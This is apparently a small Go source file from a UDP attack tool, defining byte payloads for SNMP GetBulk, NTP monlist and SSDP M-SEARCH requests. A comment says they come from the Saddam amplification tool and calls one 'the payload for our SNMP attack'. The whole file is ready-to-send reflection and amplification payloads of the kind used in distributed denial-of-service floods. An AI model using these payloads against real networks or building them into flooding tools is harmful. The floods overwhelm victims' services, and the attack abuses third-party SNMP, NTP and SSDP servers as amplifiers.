package udp

// Payloads originally taken from https://github.com/OffensivePython/Saddam
var (
	// SNMPPayload the payload for our SNMP attack
	SNMPPayload = []byte{0x30, 0x26, 0x02, 0x01, 0x01, 0x04, 0x06,
		0x70, 0x75, 0x62, 0x6c, 0x69, 0x63, 0xa5, 0x19, 0x02,
		0x04, 0x71, 0xb4, 0xb5, 0x68, 0x02, 0x01, 0x00, 0x02,
		0x01, 0x7F, 0x30, 0x0b, 0x30, 0x09, 0x06, 0x05, 0x2b,
		0x06, 0x01, 0x02, 0x01, 0x05, 0x00}
	NTPPayload  = []byte{0x17, 0x00, 0x02, 0x2a, 0x00, 0x00, 0x00, 0x00}
	SSDPPayload = []byte(`'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n'`)
)
